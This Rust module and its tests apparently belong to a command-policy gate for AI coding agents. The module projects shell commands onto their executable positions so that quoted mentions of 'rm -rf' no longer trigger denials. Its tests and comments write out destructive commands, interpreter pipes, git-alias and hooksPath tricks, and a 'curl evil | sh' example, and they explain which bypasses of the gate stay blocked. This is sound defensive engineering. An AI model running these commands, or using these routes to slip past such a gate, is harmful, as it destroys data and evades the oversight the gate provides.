//! Executable-position projection of a shell command.
//!
//! WHY THIS EXISTS. `deny-destructive-commands` matches the regex `rm\s+-` against the
//! *entire command text* (`handler.rs` substitutes the full command as `target` for
//! Bash/Shell), so the gate fires on any textual **mention** of a destructive token,
//! wherever it sits. Its companion `allow-rm-whitelisted-scratch` is anchored (`^…$`), so
//! it can only ever rescue a command that *is* an `rm`. The asymmetry is the defect: a
//! mention inside quoted content is unrescuable by construction.
//!
//! On 2026-07-27 that cost ten denies to one member in one day — `cat > /tmp/x <<'RUST'`
//! writing a test fixture whose *string literal* quoted a destructive command, and, while
//! reading this very file to diagnose it, `grep -rn "rm -rf\|destructive" presets.rs`: a
//! read-only search blocked because of what the search pattern said. kimi-code, upholding
//! the appeal (adjudication `62cfdffe`): *"the gate should learn to distinguish
//! token-in-quoted-content from token-in-executable-position; the appeal channel is
//! currently absorbing a tokenizer deficiency."* This is that distinction.
//!
//! WHAT IT DOES. [`executable_positions`] returns a copy of the command with **inert
//! content blanked out** — replaced by spaces, so no pattern can match there — leaving
//! everything that could actually execute untouched. Rules opt in via
//! [`MatchScope::ExecutablePositions`](super::types::MatchScope); every other rule keeps
//! matching raw text.
//!
//! THE SAFETY ARGUMENT, which is the whole of the review surface. This function *widens*
//! what the gate permits, so every branch is written to fail **closed** — when it is not
//! certain, it blanks nothing and the caller matches raw text, i.e. today's behaviour.
//! Three independent conditions must all hold before a span is blanked:
//!
//! 1. **The span cannot expand.** Single-quoted spans and quoted-delimiter heredocs
//!    (`<<'X'`) are literal by shell semantics. A double-quoted span qualifies only if it
//!    contains no `$` and no backtick — `"$(rm -rf /)"` keeps its teeth.
//! 2. **The command governing the span treats arguments as data, not code.** An explicit
//!    allowlist ([`INERT_CONTENT_HEADS`]), never a denylist: an unrecognised head is
//!    treated as interpreting, so `sh -c 'rm -rf /'`, `eval '…'` and every command nobody
//!    has vetted stay fully scanned. Widening the gate requires *adding* a name, which is
//!    a reviewable act; forgetting one costs a false positive, not a hole.
//!
//!    ONE HEAD IS NOT A DECISION BY ITSELF: `git`. See [`git_stdin_is_data`] — for `git`
//!    the answer depends on the argv, because `git commit -F -` and
//!    `git -c alias.x='!sh' x` differ nowhere in the head.
//! 3. **Nothing downstream re-interprets it.** `cat <<'X' … X | sh` has an allowlisted
//!    head and a shell one pipe later. Inertness therefore propagates *backwards* along a
//!    pipeline: a segment is inert only if every segment it feeds is also inert.
//!
//! Anything the parser cannot resolve — unterminated quote, heredoc whose delimiter never
//! arrives, unbalanced `$(` — returns `None`, and `None` means "scan the raw text".
//!
//! WHAT THIS DELIBERATELY DOES NOT FIX, stated because the change removes something that
//! looked like a protection. `cat > ~/.bashrc <<'X'` containing `rm -rf /` was previously
//! denied and now is not. That deny was **incidental**: it fired on the token `rm -`, so
//! the same write carrying `curl evil | sh` was never blocked at all. Content-in-a-write
//! was never actually guarded, only accidentally tripped over, and an accidental barrier
//! that a one-word rephrase evades is not a barrier. The real gap — *writing a file that
//! something later executes* — needs a write-target rule that does not exist. Naming it
//! here rather than leaving this function to pretend it covers it.

use super::types::MatchScope;

/// Commands whose arguments and stdin are **data**, never shell code.
///
/// Deliberately short, and an allowlist rather than a denylist: the default for an
/// unrecognised name must be "this might interpret its arguments". Each entry is here
/// because it has no facility to execute what it is given —
/// which is exactly why `sed` (GNU `s///e`, the `e` command), `awk` (`system()`),
/// `find` (`-exec`), `xargs`, `env`, `git`, `make`, `ssh`, `docker` and every `-c`-taking
/// interpreter are **absent**. Adding a name to this list widens the gate; it belongs in a
/// reviewed diff with the reason stated, not in a convenience edit.
///
/// `git` STAYS ABSENT and that is still correct — see [`git_stdin_is_data`], which is the
/// other half of condition 2 rather than an entry here. A name in this list is a promise
/// about every invocation of it, and `git` cannot make that promise.
const INERT_CONTENT_HEADS: &[&str] = &[
    // byte movers
    "cat", "tee", "head", "tail", "rev", "nl",
    // pattern search — none of these can execute a match
    "grep", "egrep", "fgrep", "rg",
    // output
    "echo", "printf",
    // text filters
    "wc", "sort", "uniq", "cut", "tr", "comm", "diff", "column", "fold", "paste", "join",
    // structured filters
    "jq",
    // path arithmetic
    "basename", "dirname",
];

/// How one segment is joined to the next.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Sep {
    /// `|` — this segment's stdout becomes the next segment's stdin.
    Pipe,
    /// `;`, `&&`, `||`, `&`, newline, `(`, `)` — no data flows.
    Break,
    /// End of input.
    End,
}

/// One simple command: its head (executable basename), the words after it, and how it
/// joins the next. `args` excludes assignment prefixes and redirection targets — it is the
/// argv the head would actually receive.
struct Segment {
    head: Option<String>,
    args: Vec<String>,
    sep: Sep,
}

impl Segment {
    /// Condition 2: does this command treat its arguments and stdin as data?
    fn treats_content_as_data(&self) -> bool {
        match self.head.as_deref() {
            Some("git") => git_stdin_is_data(&self.args),
            Some(h) => INERT_CONTENT_HEADS.contains(&h),
            None => false,
        }
    }
}

/// `git` config keys that a command may set inline (`-c KEY=VALUE`) without changing what
/// git will *execute*. Deliberately two entries: an inline config is the documented way to
/// hand git new code (`core.hooksPath`, `core.pager`, `alias.*`, `core.fsmonitor`,
/// `diff.*.textconv`, `credential.helper` …), so the default for an unlisted key must be
/// "this might introduce an interpreter". Identity is the one thing a member routinely
/// sets on a commit that cannot run anything.
const GIT_INERT_CONFIG_KEYS: &[&str] = &["user.name", "user.email"];

/// `git` global options taking no value that cannot re-point it at code.
const GIT_INERT_GLOBAL_FLAGS: &[&str] = &[
    "--no-pager",
    "--bare",
    "--literal-pathspecs",
    "--no-replace-objects",
    "--no-optional-locks",
];

/// `git` global options taking a value (`--git-dir=X` or `--git-dir X`) that select WHERE
/// git works, never WHAT it runs. `--exec-path` and `--config-env` are absent on purpose:
/// both name code or config the command text itself chose.
const GIT_INERT_GLOBAL_VALUE_OPTS: &[&str] = &["-C", "--git-dir", "--work-tree", "--namespace"];

/// Is this `git` invocation one whose **stdin is data**, so a quoted heredoc body fed to it
/// can never be executed?
///
/// WHY THIS EXISTS RATHER THAN A NEW ENTRY IN [`INERT_CONTENT_HEADS`]. Adjudication
/// `a96b79c4…` (kimi-code, cross-vendor arbiter, UPHELD) on deny `9199c25e…`: an identical
/// quoted-delimiter heredoc body carrying the same token was ALLOWED under `cat` and
/// DENIED under `git commit -F -`, because the head basename alone decided. The ruling
/// names both the gap and the shape of the repair, and rules OUT the obvious one:
///
/// > the remedy is NOT adding git to the head-level allowlist — the very denied command
/// > carried `-c` flags, the capability that justifies git's exclusion, and a head-only
/// > list cannot distinguish `git commit -F -` from `git -c core.hooksPath=… commit`.
/// > […] argv-position-aware inertness for stdin consumers (commit/tag -F -).
///
/// So this walks the argv and vouches only for a shape, failing closed at the first thing
/// it does not recognise — the same discipline as the head allowlist, one level finer:
///
/// 1. Every **global option** before the subcommand must be one that cannot introduce an
///    interpreter. `-c` is admitted only for [`GIT_INERT_CONFIG_KEYS`]; `--exec-path`,
///    `--config-env` and anything unlisted stop the walk.
/// 2. The **subcommand** must be one whose stdin is content, and it must be a git builtin.
///    That second clause is load-bearing and is enforced by git itself rather than here:
///    git refuses to let an alias shadow an existing command, so `commit`, `tag` and
///    `hash-object` cannot be redefined — while clause 1 keeps a *new* alias off the
///    command line, which is the `git -c alias.x='!sh' x <<'X'` bypass.
/// 3. Something in the argv must actually **declare stdin to be that content** — `-F -`,
///    `--file=-`, `--stdin`. `git commit -m x <<'X'` is not vouched for: nothing says the
///    body is message bytes, and unknown means scanned.
///
/// WHAT THIS DOES NOT CLAIM. It does not say the *repository* is safe — a `commit-msg`
/// hook already on disk can do anything with the message, and this function cannot see the
/// filesystem. It says the **command text** introduces no interpreter for its own stdin,
/// which is the only question a text matcher can answer, and the same standard already
/// applied to `cat > f` (whose target is likewise executed later by something else — see
/// the module note on what this deliberately does not fix).
fn git_stdin_is_data(args: &[String]) -> bool {
    let mut i = 0usize;

    // ---- 1. global options, up to the subcommand ----
    let subcommand = loop {
        let Some(a) = args.get(i).map(String::as_str) else {
            return false; // `git` with no subcommand at all
        };
        if !a.starts_with('-') {
            i += 1;
            break a;
        }
        i += 1;

        if a == "-c" {
            let Some(kv) = args.get(i) else { return false };
            i += 1;
            if !git_config_is_inert(kv) {
                return false;
            }
            continue;
        }
        if let Some(kv) = a.strip_prefix("-c") {
            // git's glued form, `-ckey=value`.
            if !git_config_is_inert(kv) {
                return false;
            }
            continue;
        }
        if GIT_INERT_GLOBAL_FLAGS.contains(&a) {
            continue;
        }
        let name = a.split('=').next().unwrap_or(a);
        if GIT_INERT_GLOBAL_VALUE_OPTS.contains(&name) {
            if !a.contains('=') {
                // the value is the next word
                if args.get(i).is_none() {
                    return false;
                }
                i += 1;
            }
            continue;
        }
        return false; // unrecognised global option: unknown means scanned
    };

    // ---- 2 + 3. subcommand, and the flag that declares stdin to be content ----
    let rest = &args[i..];
    match subcommand {
        "commit" | "tag" => message_comes_from_stdin(rest),
        "hash-object" => rest.iter().any(|a| a == "--stdin"),
        _ => false,
    }
}

/// `-c KEY=VALUE` where KEY cannot change what git executes.
fn git_config_is_inert(kv: &str) -> bool {
    let Some(eq) = kv.find('=') else {
        // `-c key` with no `=` sets it to true. No listed key is a boolean, so this is
        // always some other key: refuse.
        return false;
    };
    let key = &kv[..eq];
    GIT_INERT_CONFIG_KEYS.iter().any(|k| key.eq_ignore_ascii_case(k))
}

/// Does this argv say "read the message from stdin"? `-F -`, `-F-`, `--file=-`, `--file -`.
/// `-F /path` is a FILE and is deliberately not vouched for: the heredoc body is then not
/// what git reads, so nothing here knows what happens to it.
fn message_comes_from_stdin(rest: &[String]) -> bool {
    fn is_stdin(v: &str) -> bool {
        // `/dev/stdin` is the same act spelled as a path (kimi's design sketch names it).
        v == "-" || v == "/dev/stdin"
    }
    let mut it = rest.iter();
    while let Some(a) = it.next() {
        if let Some(v) = a.strip_prefix("--file=") {
            return is_stdin(v);
        }
        if a == "-F" || a == "--file" {
            return it.next().is_some_and(|v| is_stdin(v));
        }
        if let Some(v) = a.strip_prefix("-F") {
            if is_stdin(v) {
                return true;
            }
        }
    }
    false
}

/// Project `cmd` onto the regions where a destructive token could actually *execute*,
/// blanking inert content with spaces.
///
/// Returns `None` when the command cannot be parsed with confidence. Callers must treat
/// `None` as "match the raw command" — the parser refusing is never a reason to skip a
/// check.
///
/// Character count is preserved (blanked bytes become `' '`, newlines are kept) so that
/// anything reported against offsets in the projection still lines up with the original.
pub fn executable_positions(cmd: &str) -> Option<String> {
    let ch: Vec<char> = cmd.chars().collect();
    let n = ch.len();

    let mut segs: Vec<Segment> = vec![Segment { head: None, args: Vec::new(), sep: Sep::End }];
    // (segment index, start, end) of every span that passed condition 1.
    let mut inert_spans: Vec<(usize, usize, usize)> = Vec::new();
    // Heredocs opened on the current line, consumed in order at the next newline.
    let mut pending: Vec<PendingHeredoc> = Vec::new();

    let mut seg = 0usize;
    let mut word = String::new();
    let mut word_quoted = false;
    let mut head_done = false;
    // A redirection operator was just read; the next word is its target, not the head.
    let mut expect_redir_target = false;
    // Depth of `$( … )`. Inside a substitution nothing is ever blanked.
    let mut subst_depth = 0usize;

    let mut i = 0usize;
    while i < n {
        let c = ch[i];

        match c {
            // ---- escape, outside quotes ----
            '\\' => {
                if i + 1 >= n {
                    return None; // trailing backslash: unresolved
                }
                word.push(c);
                word.push(ch[i + 1]);
                word_quoted = true;
                i += 2;
            }

            // ---- single quotes: literal by shell semantics ----
            '\'' => {
                let start = i + 1;
                let end = find_unescaped(&ch, start, '\'', false)?;
                if subst_depth == 0 {
                    inert_spans.push((seg, start, end));
                }
                word.push_str(&ch[start..end].iter().collect::<String>());
                word_quoted = true;
                i = end + 1;
            }

            // ---- double quotes: literal only when nothing can expand inside ----
            '"' => {
                let start = i + 1;
                let end = find_unescaped(&ch, start, '"', true)?;
                let body: String = ch[start..end].iter().collect();
                // `$` covers `$(…)`, `${…}` and `$VAR`; a backtick covers the old form.
                // Anything expandable stays visible to the matcher.
                if subst_depth == 0 && !body.contains('$') && !body.contains('`') {
                    inert_spans.push((seg, start, end));
                }
                word.push_str(&body);
                word_quoted = true;
                i = end + 1;
            }

            // ---- command substitution: never blanked, tracked so `)` is not a break ----
            '$' if i + 1 < n && ch[i + 1] == '(' => {
                subst_depth += 1;
                word.push_str("$(");
                i += 2;
            }
            '`' => {
                // Backtick substitution. Skip the whole region; record nothing.
                let end = find_unescaped(&ch, i + 1, '`', true)?;
                word_quoted = true;
                i = end + 1;
            }

            // ---- heredoc / herestring ----
            '<' if i + 1 < n && ch[i + 1] == '<' => {
                if i + 2 < n && ch[i + 2] == '<' {
                    // `<<<` herestring: the following word is data and is handled by the
                    // normal quoting rules, so just consume the operator.
                    flush_word(&mut word, &mut word_quoted, &mut head_done, &mut expect_redir_target, &mut segs, seg);
                    i += 3;
                } else {
                    flush_word(&mut word, &mut word_quoted, &mut head_done, &mut expect_redir_target, &mut segs, seg);
                    i += 2;
                    let strip_tabs = i < n && ch[i] == '-';
                    if strip_tabs {
                        i += 1;
                    }
                    while i < n && (ch[i] == ' ' || ch[i] == '\t') {
                        i += 1;
                    }
                    let (delim, quoted, next) = read_heredoc_delimiter(&ch, i)?;
                    i = next;
                    pending.push(PendingHeredoc { delim, quoted, strip_tabs, seg });
                }
            }

            // ---- redirections ----
            '>' | '<' => {
                // A bare fd number in front of the operator (`2>`) is not a head.
                if word.chars().all(|c| c.is_ascii_digit()) {
                    word.clear();
                    word_quoted = false;
                }
                flush_word(&mut word, &mut word_quoted, &mut head_done, &mut expect_redir_target, &mut segs, seg);
                i += 1;
                while i < n && matches!(ch[i], '>' | '<' | '&' | '|') {
                    i += 1;
                }
                expect_redir_target = true;
            }

            // ---- segment separators ----
            '|' | ';' | '&' | '(' | '{' | '}' => {
                if c == '(' && subst_depth > 0 {
                    // A `(` inside a substitution we are already tracking.
                    word.push(c);
                    i += 1;
                    continue;
                }
                flush_word(&mut word, &mut word_quoted, &mut head_done, &mut expect_redir_target, &mut segs, seg);
                let is_pipe = c == '|' && !(i + 1 < n && ch[i + 1] == '|');
                segs[seg].sep = if is_pipe { Sep::Pipe } else { Sep::Break };
                segs.push(Segment { head: None, args: Vec::new(), sep: Sep::End });
                seg += 1;
                head_done = false;
                expect_redir_target = false;
                // consume doubled operators (`&&`, `||`)
                i += 1;
                if i < n && ch[i] == c && (c == '&' || c == '|') {
                    i += 1;
                }
            }
            ')' => {
                if subst_depth > 0 {
                    subst_depth -= 1;
                    word.push(c);
                    i += 1;
                } else {
                    flush_word(&mut word, &mut word_quoted, &mut head_done, &mut expect_redir_target, &mut segs, seg);
                    segs[seg].sep = Sep::Break;
                    segs.push(Segment { head: None, args: Vec::new(), sep: Sep::End });
                    seg += 1;
                    head_done = false;
                    expect_redir_target = false;
                    i += 1;
                }
            }

            // ---- newline: heredoc bodies land here, then a new segment ----
            '\n' => {
                flush_word(&mut word, &mut word_quoted, &mut head_done, &mut expect_redir_target, &mut segs, seg);
                i += 1;
                for hd in std::mem::take(&mut pending) {
                    let (body_start, body_end, after) = consume_heredoc_body(&ch, i, &hd)?;
                    if hd.quoted && subst_depth == 0 {
                        inert_spans.push((hd.seg, body_start, body_end));
                    }
                    i = after;
                }
                segs[seg].sep = Sep::Break;
                segs.push(Segment { head: None, args: Vec::new(), sep: Sep::End });
                seg += 1;
                head_done = false;
                expect_redir_target = false;
            }

            // ---- word boundary ----
            ' ' | '\t' | '\r' => {
                flush_word(&mut word, &mut word_quoted, &mut head_done, &mut expect_redir_target, &mut segs, seg);
                i += 1;
            }

            _ => {
                word.push(c);
                i += 1;
            }
        }
    }

    if subst_depth != 0 {
        return None; // unbalanced `$(`
    }
    if !pending.is_empty() {
        return None; // heredoc opened, body never arrived
    }
    flush_word(&mut word, &mut word_quoted, &mut head_done, &mut expect_redir_target, &mut segs, seg);

    // Condition 2 + 3, resolved together. Walk backwards so a segment can only be inert
    // if the segment it pipes into is inert too.
    let mut inert_seg = vec![false; segs.len()];
    for k in (0..segs.len()).rev() {
        let head_ok = segs[k].treats_content_as_data();
        inert_seg[k] = head_ok
            && match segs[k].sep {
                Sep::Pipe => inert_seg.get(k + 1).copied().unwrap_or(false),
                _ => true,
            };
    }

    let mut out = ch.clone();
    for (s, start, end) in inert_spans {
        if !inert_seg.get(s).copied().unwrap_or(false) {
            continue;
        }
        for slot in out.iter_mut().take(end).skip(start) {
            if *slot != '\n' {
                *slot = ' ';
            }
        }
    }
    Some(out.into_iter().collect())
}

/// Apply the scope to a command, returning the text a matcher should run against.
///
/// [`MatchScope::Raw`] is the identity. [`MatchScope::ExecutablePositions`] falls back to
/// the raw command whenever the projection cannot be computed — the fail-closed edge.
pub fn project<'a>(cmd: &'a str, scope: MatchScope) -> std::borrow::Cow<'a, str> {
    match scope {
        MatchScope::Raw => std::borrow::Cow::Borrowed(cmd),
        MatchScope::ExecutablePositions => match executable_positions(cmd) {
            Some(p) => std::borrow::Cow::Owned(p),
            None => std::borrow::Cow::Borrowed(cmd),
        },
    }
}

struct PendingHeredoc {
    delim: String,
    /// Delimiter was quoted (`<<'X'`, `<<"X"`, `<<\X`) — the body cannot expand.
    quoted: bool,
    /// `<<-` form: leading tabs are stripped before comparing the terminator.
    strip_tabs: bool,
    seg: usize,
}

/// Find the next unescaped `close` at or after `from`. `honour_backslash` is false inside
/// single quotes, where a backslash is an ordinary character.
fn find_unescaped(ch: &[char], from: usize, close: char, honour_backslash: bool) -> Option<usize> {
    let mut i = from;
    while i < ch.len() {
        if honour_backslash && ch[i] == '\\' {
            i += 2;
            continue;
        }
        if ch[i] == close {
            return Some(i);
        }
        i += 1;
    }
    None // unterminated — fail closed
}

/// Read a heredoc delimiter at `i`, returning `(delimiter, was_quoted, next_index)`.
fn read_heredoc_delimiter(ch: &[char], mut i: usize) -> Option<(String, bool, usize)> {
    let mut delim = String::new();
    let mut quoted = false;
    if i >= ch.len() {
        return None;
    }
    while i < ch.len() {
        match ch[i] {
            '\'' | '"' => {
                let q = ch[i];
                quoted = true;
                let end = find_unescaped(ch, i + 1, q, q == '"')?;
                delim.push_str(&ch[i + 1..end].iter().collect::<String>());
                i = end + 1;
            }
            '\\' => {
                if i + 1 >= ch.len() {
                    return None;
                }
                quoted = true;
                delim.push(ch[i + 1]);
                i += 2;
            }
            c if c.is_whitespace() || matches!(c, ';' | '&' | '|' | '<' | '>' | '(' | ')') => break,
            c => {
                delim.push(c);
                i += 1;
            }
        }
    }
    if delim.is_empty() {
        return None;
    }
    Some((delim, quoted, i))
}

/// Consume a heredoc body starting at `from`, returning `(body_start, body_end, after)`.
/// `None` if the terminator never appears — an unterminated heredoc is exactly the case
/// where guessing would be worst.
fn consume_heredoc_body(ch: &[char], from: usize, hd: &PendingHeredoc) -> Option<(usize, usize, usize)> {
    let body_start = from;
    let mut line_start = from;
    let mut i = from;
    while i <= ch.len() {
        if i == ch.len() || ch[i] == '\n' {
            let raw: String = ch[line_start..i].iter().collect();
            let line = if hd.strip_tabs { raw.trim_start_matches('\t') } else { &raw };
            if line.trim_end_matches('\r') == hd.delim {
                let after = if i == ch.len() { i } else { i + 1 };
                return Some((body_start, line_start, after));
            }
            if i == ch.len() {
                return None; // ran out of input before the terminator
            }
            line_start = i + 1;
        }
        i += 1;
    }
    None
}

/// Close off the current word, assigning the segment head the first time a word appears
/// that is neither a variable assignment nor a redirection target. Every later word is
/// recorded as an argument, because condition 2 is not always answerable from the head
/// alone (see [`git_stdin_is_data`]).
fn flush_word(
    word: &mut String,
    word_quoted: &mut bool,
    head_done: &mut bool,
    expect_redir_target: &mut bool,
    segs: &mut [Segment],
    seg: usize,
) {
    if word.is_empty() {
        *word_quoted = false;
        return;
    }
    if *expect_redir_target {
        *expect_redir_target = false;
    } else if !*head_done {
        if !*word_quoted && is_assignment(word) {
            // `FOO=bar cmd …` — keep looking for the head.
        } else {
            segs[seg].head = Some(basename(word).to_string());
            *head_done = true;
        }
    } else {
        segs[seg].args.push(word.clone());
    }
    word.clear();
    *word_quoted = false;
}

fn is_assignment(word: &str) -> bool {
    let Some(eq) = word.find('=') else { return false };
    if eq == 0 {
        return false;
    }
    let name = &word[..eq];
    name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

fn basename(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or(word)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Did the destructive token survive the projection? `true` means the gate still sees
    /// it (and will deny); `false` means it was recognised as inert content.
    fn still_visible(cmd: &str) -> bool {
        let projected = project(cmd, MatchScope::ExecutablePositions);
        regex::Regex::new(r"rm\s+-").unwrap().is_match(&projected)
    }

    /// The same matcher against the UNPROJECTED text. A `!still_visible` assertion is only
    /// evidence if the token was there to lose — otherwise a typo in the fixture reads as
    /// a pass.
    fn still_visible_raw(cmd: &str) -> bool {
        regex::Regex::new(r"rm\s+-").unwrap().is_match(cmd)
    }

    // ---- the cases that must STILL be denied. Each of these is a way the widening
    // could have become a hole; they are the reason the allowlist is an allowlist. ----

    #[test]
    fn a_real_destructive_command_is_untouched() {
        assert!(still_visible("rm -rf /"));
        assert!(still_visible("rm -rf /etc && echo done"));
        assert!(still_visible("cd /tmp; rm -rf ../home"));
    }

    #[test]
    fn interpreters_are_not_on_the_allowlist() {
        assert!(still_visible("sh -c 'rm -rf /'"));
        assert!(still_visible("bash -c \"rm -rf /\""));
        assert!(still_visible("eval 'rm -rf /'"));
        assert!(still_visible("env FOO=1 sh -c 'rm -rf /'"));
    }

    #[test]
    fn command_substitution_keeps_its_teeth() {
        assert!(still_visible("echo \"$(rm -rf /)\""));
        assert!(still_visible("echo \"`rm -rf /`\""));
        assert!(still_visible("echo $(rm -rf /tmp/x && ls)"));
    }

    #[test]
    fn an_inert_head_piped_into_a_shell_is_not_inert() {
        // The bypass this design exists to refuse: `cat` governs the heredoc, but `sh`
        // is one pipe downstream, so the body is executable after all.
        assert!(still_visible("cat <<'X' | sh\nrm -rf /\nX"));
        assert!(still_visible("echo 'rm -rf /' | sh"));
        assert!(still_visible("echo 'rm -rf /' | bash -s"));
    }

    #[test]
    fn unrecognised_heads_are_treated_as_interpreting() {
        // `mycmd` might be anything. Unknown must mean scanned.
        assert!(still_visible("mycmd 'rm -rf /'"));
        assert!(still_visible("xargs rm -rf"));
        assert!(still_visible("find . -name x -exec rm -rf {} +"));
        // sed and awk can execute what they are given; deliberately absent from the list.
        assert!(still_visible("sed 's/a/rm -rf \\/tmp/e' f"));
        assert!(still_visible("awk '{system(\"rm -rf /\")}' f"));
    }

    #[test]
    fn unparseable_input_falls_back_to_raw() {
        assert_eq!(executable_positions("echo 'unterminated"), None);
        assert_eq!(executable_positions("cat <<'X'\nrm -rf /\n"), None);
        assert_eq!(executable_positions("echo $(rm -rf /"), None);
        // …and the caller therefore still sees the token.
        assert!(still_visible("cat <<'X'\nrm -rf /\n"));
    }

    #[test]
    fn unquoted_heredoc_delimiter_can_expand_so_stays_visible() {
        // `<<X` (unquoted) expands `$(…)`, so its body is not literal.
        assert!(still_visible("cat > /tmp/f <<X\nrm -rf /\nX"));
    }

    // ---- the false positives this change exists to remove ----

    #[test]
    fn the_grep_that_started_this() {
        // The literal deny ae5ced17… taken while reading presets.rs.
        assert!(!still_visible(
            "ls core/src/policy/ 2>/dev/null && grep -rn \"rm -rf\\|destructive\" core/src/policy/presets.rs | head -30"
        ));
    }

    #[test]
    fn a_quoted_heredoc_writing_a_test_fixture() {
        // The shape of deny 8bea2e21… — kimi's upheld appeal.
        let cmd = "cat > /tmp/scratch/appeal_tests.rs <<'RUST'\n\
                   let attempted = \"rm -rf /tmp/x && mkdir /tmp/x\";\n\
                   RUST";
        assert!(!still_visible(cmd));
    }

    #[test]
    fn searching_for_the_token_is_not_using_it() {
        assert!(!still_visible("grep 'rm -rf' /var/log/audit.log"));
        assert!(!still_visible("rg \"rm -rf\" src/"));
        assert!(!still_visible("echo 'the rule blocks rm -rf'"));
        assert!(!still_visible("printf '%s\\n' 'rm -rf /'"));
    }

    #[test]
    fn inert_pipelines_stay_inert_end_to_end() {
        assert!(!still_visible("grep 'rm -rf' log | head -30"));
        assert!(!still_visible("cat /tmp/f | grep 'rm -rf' | wc -l"));
    }

    #[test]
    fn blanking_preserves_length_and_newlines() {
        let cmd = "grep 'rm -rf' f";
        let p = executable_positions(cmd).unwrap();
        assert_eq!(p.chars().count(), cmd.chars().count());
        let multi = "cat <<'X'\nrm -rf /\nX";
        let p2 = executable_positions(multi).unwrap();
        assert_eq!(p2.matches('\n').count(), multi.matches('\n').count());
    }

    #[test]
    fn double_quotes_are_inert_only_without_expansion() {
        assert!(!still_visible("grep \"rm -rf\" f"));
        assert!(still_visible("grep \"$X rm -rf\" f")); // `$` present → left visible
    }

    #[test]
    fn assignments_and_redirections_do_not_confuse_head_detection() {
        assert!(!still_visible("LC_ALL=C grep 'rm -rf' f"));
        assert!(!still_visible("grep 'rm -rf' f 2>/dev/null"));
        assert!(!still_visible("grep -rn 'rm -rf' . > /tmp/out.txt"));
    }

    #[test]
    fn raw_scope_is_the_identity() {
        let cmd = "grep 'rm -rf' f";
        assert_eq!(project(cmd, MatchScope::Raw), cmd);
    }

    // ---- `git`: the head is not enough, in BOTH directions ----
    //
    // Adjudication a96b79c4… (kimi-code, cross-vendor, UPHELD) on deny 9199c25e…: the same
    // quoted heredoc body was ALLOWED under `cat` and DENIED under `git commit -F -`, and
    // the ruling names the remedy — "argv-position-aware inertness for stdin consumers
    // (commit/tag -F -)", explicitly NOT adding `git` to the head-level allowlist.

    #[test]
    fn adding_git_to_the_head_allowlist_would_be_dead_code_so_say_so() {
        // Found by sabotaging this diff's own controls. `treats_content_as_data` matches
        // `Some("git")` BEFORE consulting the list, so a future editor who "widens the
        // allowlist" the documented way — add a name, in a reviewed diff — changes
        // nothing at all, and every test here stays green about it. That is the exact
        // failure mode this module's doc comment warns about in the other direction, so
        // make the shadow loud instead of silent.
        assert!(
            !INERT_CONTENT_HEADS.contains(&"git"),
            "git in INERT_CONTENT_HEADS is unreachable — the Some(\"git\") arm in \
             Segment::treats_content_as_data decides first. Change git_stdin_is_data."
        );
    }

    #[test]
    fn the_commit_message_that_started_this() {
        // Deny 9199c25e… verbatim in shape: the `-c` flags are the ones that were on it.
        let cmd = "git -c user.name=\"Dennis Palatov\" -c user.email=\"dp@dpcars.net\" \
                   commit -q -F - <<'MSG'\n\
                   the preset denies rm -rf / and that is what this documents\n\
                   MSG";
        assert!(!still_visible(cmd));
        assert!(!still_visible("git commit -F - <<'MSG'\nrm -rf /\nMSG"));
        assert!(!still_visible("git tag -a v1 -F - <<'MSG'\nrm -rf /\nMSG"));
        assert!(!still_visible("git commit --file=- <<'MSG'\nrm -rf /\nMSG"));
        assert!(!still_visible("git commit -F /dev/stdin <<'MSG'\nrm -rf /\nMSG"));
        // kimi's own cross-seat repro of the mechanism.
        assert!(!still_visible("git hash-object --stdin <<'MSG'\nrm -rf /\nMSG"));
    }

    #[test]
    fn the_denied_command_verbatim_not_just_its_shape() {
        // `attempted` from policy_decision 9199c25e…, trimmed only in the message body.
        // The shape matters beyond the git segment: the heredoc opens in the THIRD `&&`
        // segment and a FOURTH segment (`&& git log`) follows the opener on the same line
        // before the body arrives at the newline. A projection that got segment ownership
        // wrong would still pass every row above and fail here.
        let cmd = "cd /mnt/c/exe/projects/ai-agents/hestia/.wt/claude-unevaluable \
                   && git add core/src/server/handler.rs tools/ladder.py \
                   && git -c user.name=\"Dennis Palatov\" -c user.email=\"dp@dpcars.net\" \
                   commit -q -F - <<'MSG' && git log --oneline -1\n\
                   gate: an ALLOW that saw nothing now says so\n\
                   \n\
                   `rm -rf / --no-preserve-root` is DENIED at `parameters.command` and\n\
                   ALLOWED at `tool_input.command`.\n\
                   MSG";
        assert!(still_visible_raw(cmd), "precondition: the raw text does carry the token");
        assert!(!still_visible(cmd));
    }

    #[test]
    fn refusing_every_dash_c_would_refuse_the_command_the_ruling_was_about() {
        // Recorded because a stricter rule is the obvious reading and it does not work.
        // The design sketch published alongside the ruling says the preconditions are
        // "global flags carry no `-c`/`--config*`" — but `attempted` on deny 9199c25e…
        // carries `-c user.name` and `-c user.email`, so that rule denies the motivating
        // case. Admitting exactly the identity keys is what closes the loop; every other
        // key is where the ruling's caveat bites.
        let v = |xs: &[&str]| xs.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        assert!(git_stdin_is_data(&v(&[
            "-c", "user.name=Dennis Palatov",
            "-c", "user.email=dp@dpcars.net",
            "commit", "-q", "-F", "-",
        ])));
        assert!(!git_stdin_is_data(&v(&["-c", "core.hooksPath=/tmp/x", "commit", "-F", "-"])));
        assert!(!git_stdin_is_data(&v(&["-c", "user.name", "commit", "-F", "-"])));
    }

    #[test]
    fn git_globals_that_can_introduce_an_interpreter_stay_visible() {
        // The ruling's caveat, as a test: a head-only list cannot tell these apart, so the
        // argv walk must. `-c` with an unvetted key, and `--exec-path`, both re-point git
        // at code the command text itself chose.
        assert!(still_visible(
            "git -c core.hooksPath=/tmp/evil commit -F - <<'MSG'\nrm -rf /\nMSG"
        ));
        assert!(still_visible(
            "git --exec-path=/tmp/evil commit -F - <<'MSG'\nrm -rf /\nMSG"
        ));
        assert!(still_visible(
            "git --config-env=core.pager=EV commit -F - <<'MSG'\nrm -rf /\nMSG"
        ));
        // An alias defined on the command line makes the subcommand arbitrary code, and
        // the heredoc becomes that code's stdin.
        assert!(still_visible("git -c alias.msg='!sh -s' msg <<'MSG'\nrm -rf /\nMSG"));
    }

    #[test]
    fn git_subcommands_that_do_not_take_stdin_as_data_stay_visible() {
        // No `-F -`: nothing declares the body to be message bytes, so it is not vouched
        // for. Unknown-shape means scanned, exactly as an unknown head does.
